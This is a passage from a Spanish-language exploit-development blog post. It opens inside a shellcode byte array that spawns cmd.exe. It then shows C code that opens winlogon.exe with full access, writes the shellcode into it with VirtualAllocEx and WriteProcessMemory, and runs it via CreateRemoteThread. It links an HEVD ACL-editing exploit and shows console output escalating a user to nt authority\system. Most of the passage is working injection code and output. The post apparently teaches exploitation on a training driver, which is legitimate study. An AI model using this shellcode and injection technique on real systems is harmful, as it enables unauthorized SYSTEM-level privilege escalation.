    0xfc</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x51</span><span class="p">,</span><span class="mi">
    0x41</span><span class="p">,</span><span class="mi"> 0x50</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x51</span><span class="p">,</span><span class="mi"> 0x56</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xd2</span><span class="p">,</span><span class="mi"> 0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi">
    0x60</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x18</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x72</span><span class="p">,</span><span class="mi">
    0x50</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0xb7</span><span class="p">,</span><span class="mi"> 0x4a</span><span class="p">,</span><span class="mi"> 0x4a</span><span class="p">,</span><span class="mi"> 0x4d</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi">
    0xac</span><span class="p">,</span><span class="mi"> 0x3c</span><span class="p">,</span><span class="mi"> 0x61</span><span class="p">,</span><span class="mi"> 0x7c</span><span class="p">,</span><span class="mi"> 0x02</span><span class="p">,</span><span class="mi"> 0x2c</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x0d</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi">
    0x01</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0xe2</span><span class="p">,</span><span class="mi"> 0xed</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x51</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi">
    0x42</span><span class="p">,</span><span class="mi"> 0x3c</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi">
    0x85</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x74</span><span class="p">,</span><span class="mi"> 0x67</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x50</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x18</span><span class="p">,</span><span class="mi"> 0x44</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x49</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0xe3</span><span class="p">,</span><span class="mi"> 0x56</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x34</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd6</span><span class="p">,</span><span class="mi"> 0x4d</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi">
    0xac</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x0d</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x38</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xf1</span><span class="p">,</span><span class="mi">
    0x4c</span><span class="p">,</span><span class="mi"> 0x03</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x24</span><span class="p">,</span><span class="mi"> 0x08</span><span class="p">,</span><span class="mi"> 0x45</span><span class="p">,</span><span class="mi"> 0x39</span><span class="p">,</span><span class="mi"> 0xd1</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xd8</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x44</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x24</span><span class="p">,</span><span class="mi"> 0x49</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x0c</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x44</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x1c</span><span class="p">,</span><span class="mi"> 0x49</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0xd0</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x5e</span><span class="p">,</span><span class="mi"> 0x59</span><span class="p">,</span><span class="mi"> 0x5a</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x59</span><span class="p">,</span><span class="mi">
    0x41</span><span class="p">,</span><span class="mi"> 0x5a</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xec</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi">
    0x59</span><span class="p">,</span><span class="mi"> 0x5a</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x12</span><span class="p">,</span><span class="mi"> 0xe9</span><span class="p">,</span><span class="mi"> 0x57</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0x5d</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi">
    0xba</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8d</span><span class="p">,</span><span class="mi"> 0x8d</span><span class="p">,</span><span class="mi">
    0x01</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xba</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x6f</span><span class="p">,</span><span class="mi"> 0x87</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xd5</span><span class="p">,</span><span class="mi">
    0xbb</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0xc5</span><span class="p">,</span><span class="mi"> 0xe2</span><span class="p">,</span><span class="mi"> 0x5d</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xba</span><span class="p">,</span><span class="mi"> 0xa6</span><span class="p">,</span><span class="mi"> 0x95</span><span class="p">,</span><span class="mi"> 0xbd</span><span class="p">,</span><span class="mi"> 0x9d</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi">
    0xd5</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xc4</span><span class="p">,</span><span class="mi"> 0x28</span><span class="p">,</span><span class="mi"> 0x3c</span><span class="p">,</span><span class="mi"> 0x06</span><span class="p">,</span><span class="mi"> 0x7c</span><span class="p">,</span><span class="mi"> 0x0a</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xfb</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi">
    0x75</span><span class="p">,</span><span class="mi"> 0x05</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x47</span><span class="p">,</span><span class="mi"> 0x13</span><span class="p">,</span><span class="mi"> 0x72</span><span class="p">,</span><span class="mi"> 0x6f</span><span class="p">,</span><span class="mi"> 0x6a</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x59</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0xda</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xd5</span><span class="p">,</span><span class="mi"> 0x63</span><span class="p">,</span><span class="mi"> 0x6d</span><span class="p">,</span><span class="mi"> 0x64</span><span class="p">,</span><span class="mi"> 0x2e</span><span class="p">,</span><span class="mi"> 0x65</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x65</span><span class="p">,</span><span class="mi"> 0x00
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de obtener el pid podemos utilizar <code class="language-plaintext highlighter-rouge">OpenProcess</code> con derechos <code class="language-plaintext highlighter-rouge">ALL_ACCESS</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">    DWORD</span><span class="p"> pid</span><span class="o"> =</span><span class="p"> FindProcessId(</span><span class="no">L</span><span class="s">"winlogon.exe"</span><span class="p">);
    </span><span class="na">HANDLE</span><span class="p"> process</span><span class="o"> =</span><span class="p"> OpenProcess(PROCESS_ALL_ACCESS,</span><span class="mi"> FALSE</span><span class="p">, pid);</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> reservamos un buffer en el proceso para posteriormente utilizando <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> escribir nuestro shellcode para ejecutar <code class="language-plaintext highlighter-rouge">cmd.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">    LPVOID</span><span class="p"> buffer</span><span class="o"> =</span><span class="p"> VirtualAllocEx(process,</span><span class="mi"> NULL</span><span class="p">,</span><span class="na"> sizeof</span><span class="p">(cmd), (MEM_RESERVE</span><span class="o"> |</span><span class="p"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);  
    WriteProcessMemory(process, buffer, cmd,</span><span class="o"> sizeof</span><span class="p">(cmd),</span><span class="mi"> NULL</span><span class="p">);</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente utilizamos <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> para crear un hilo bajo <code class="language-plaintext highlighter-rouge">winlogon.exe</code> que ejecute nuestro shellcode, de esta forma se ejecutará con privilegios elevados</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">    CreateRemoteThread(process, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">, (LPTHREAD_START_ROUTINE) buffer, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
    CloseHandle(process);</span>
</code></pre></div></div><br>

<p class="plain-text">Un ejemplo puede ser el siguiente <a href="https://github.com/kevincillo32/ExploitDevelopment/blob/main/HEVD/StackOverflow_ACL.c">exploit</a> de <code class="language-plaintext highlighter-rouge">HEVD</code> donde con el <code class="language-plaintext highlighter-rouge">acl editing</code> logramos modificar el acl de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> para posteriormente inyectar y crear un hilo que ejecuta nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> y lanza una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - DarthBear</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
